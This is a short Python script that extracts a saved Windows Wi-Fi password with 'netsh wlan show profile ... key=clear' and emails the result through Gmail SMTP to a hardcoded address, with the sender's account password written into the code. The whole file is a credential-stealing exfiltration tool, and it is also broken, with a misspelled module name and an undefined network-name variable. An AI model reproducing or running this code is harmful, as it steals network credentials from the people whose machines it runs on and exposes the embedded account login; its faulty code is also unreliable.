import smtplib,subprocess

def sendMail(email,password,message):
    server = smptlib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

cmd = 'netsh wlan show profile ' + netname + ' key=clear' #gets wifi password on windows if windows has connected to a wifi network 
result = subprocess.check_output(cmd,shell= True)
sendMail('benpro4433@gmail.com','burn3rp4ss',result)

